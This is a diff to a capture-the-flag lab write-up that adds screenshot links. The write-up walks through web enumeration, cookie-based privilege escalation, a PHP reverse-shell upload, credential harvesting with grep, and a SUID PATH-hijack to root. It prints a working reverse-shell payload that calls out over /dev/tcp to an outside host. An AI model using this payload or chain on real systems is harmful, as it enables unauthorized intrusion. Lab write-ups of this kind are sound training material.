@@ -26,7 +26,7 @@ An Nmap scan was performed to identify open ports and running services on the ta
 **Command:**
 ```bash
 nmap -sC -sV 10.129.142.60
-
+![Nmap Scan](images/nmap-scan.png) 
 The scan revealed two exposed services:
 22/tcp (SSH)
 80/tcp (HTTP)
@@ -36,9 +36,9 @@ SSH was accessible but not immediately useful without credentials, making the we
 B) Initial Web Inspection
 
 Visiting the target in a browser presented a minimal automotive-themed web application.
-
+![Landing Page](images/landing-page.png)
 The links on the homepage do not seem to lead anywhere. However, if we scroll down, we find a hint that the services can be accessed after logging in.
-
+![Services Page](images/services-page.png) 
 According to this information, the website should have a login page. Before proceeding with directory and page enumeration, Burp Suite proxy was used to passively spider the website and map its structure.
 
 2. Web Enumeration
@@ -50,21 +50,22 @@ A) Burp Mapping
 Burp Suite was used as a passive proxy to map the application during normal browsing. This revealed additional paths not visible from the homepage, including:
 
 /cdn-cgi/login
-
+![Burp Sitemap](images/burp-sitemap.png)
 B) Login Discovery
 
 Browsing to /cdn-cgi/login exposed the application login page.
 
 Standard login attempts were unsuccessful, but the application allowed access through a guest login option.
 
-It was possible to spot directories and files that were not visible while browsing. One particularly interesting directory was /cdn-cgi/login, which presented the login page.
+It was possible to spot directories and files that were not visible while browsing. One particularly interesting directory was /cdn-cgi/login, which presented the login page:
+![Login Page](images/login-page.png) 
 
 C) Guest Access
 
 After logging in as Guest, additional application functionality became visible, including navigation options not exposed to unauthenticated users. This confirmed that more functionality existed behind the login flow.
-
+![Guest Panel](images/guest-panel.png) 
 After navigating through the available pages, the only interesting one appeared to be Uploads. However, access was restricted because super admin rights were required.
-
+![Uploads page](images/uploads-page.png) 
 3. Access Control Weakness
 
 This phase focused on analyzing how the application handled session data and access control.
@@ -75,19 +76,20 @@ Session cookies were reviewed after guest authentication. The application stored
 
 role=guest
 user=2233
-
+![Guest Cookies](images/guest-cookies.png) 
 B) User Enumeration
 
 The application exposed user identifiers through the id parameter in the admin panel. Modifying this value allowed enumeration of other users and revealed the administrator account identifier.
 
 http://10.129.143.127/cdn-cgi/login/admin.php?content=accounts&id=2
+![User Enumeration](images/user-enumeration.png) 
 
 Note: The IP changed here from 10.129.142.60 to 10.129.143.127 because the machine was turned off and restarted.
 
 C) Privilege Escalation to Admin
 
 By modifying the session cookies from guest to admin values, administrative functionality became accessible, including the upload panel.
-
+![Admin Access](images/admin-access.png)
 4. Foothold (Initial Access)
 
 This phase focused on abusing the administrative upload functionality to gain remote code execution.
@@ -104,7 +106,7 @@ Payload Used:
 system("bash -c 'bash -i >& /dev/tcp/10.10.15.27/4444 0>&1'");
 ?>
 
-Upload Panel:
+Upload Panel: ![Upload Panel](images/shell-upload-panel.png) 
 
 B) Reverse Shell Delivery
 
@@ -121,7 +123,7 @@ Command:
 nc -lvnp 4444
 
 Once the uploaded PHP payload was executed, the target initiated a connection back to the listener and returned an interactive shell as www-data.
-
+![Reverse Shell](images/reverse-shell.png) 
 C) Initial Shell Access
 
 Triggering the uploaded payload returned command execution on the target as the www-data user, establishing initial access to the system and enabling post-exploitation enumeration.
@@ -148,6 +150,7 @@ cat * | grep -i passw*
 Location:
 
 /var/www/html/cdn-cgi/login
+![Credential Discovery](images/credential-discovery.png) 
 
 C) Local User Enumeration
 
@@ -160,12 +163,10 @@ D) Pivot to Robert
 
 Initial credentials were not directly reusable for local access. Further review of db.php revealed valid credentials for lateral movement.
 
-Command:
+Command:cat db.php
+![dp.php file](images/dp.phpfile.png) 
 
-cat db.php
-
-
-
+![Robert Shell](images/robert-shell.png) 
 
 6. Privilege Escalation
 
@@ -177,7 +178,7 @@ Basic privilege escalation checks were performed:
 
 sudo -l
 id
-
+![elevating privileges](images /elevating-privileges.png) 
 The output of id confirmed that the user robert belonged to the bugtracker group, indicating a potential privilege escalation path through group-owned binaries.
 
 B) SUID Enumeration
@@ -199,7 +200,7 @@ Command:
 
 ls -la /usr/bin/bugtracker && file /usr/bin/bugtracker
 file /usr/bin/bugtracker
-
+![Bugtracker SUID](images/bugtracker-suid.png) 
 There is a SUID bit set on that binary, which is a promising exploitation path.
 
 D) PATH Hijacking
@@ -218,7 +219,7 @@ Executing bugtracker after modifying the PATH variable caused the application to
 Command:
 
 bugtracker
-
+![Root Shell](images/root-shell.png) 
 7. Flags
 User flag retrieved from /home/robert/user.txt
 Root flag retrieved from /root/root.txt
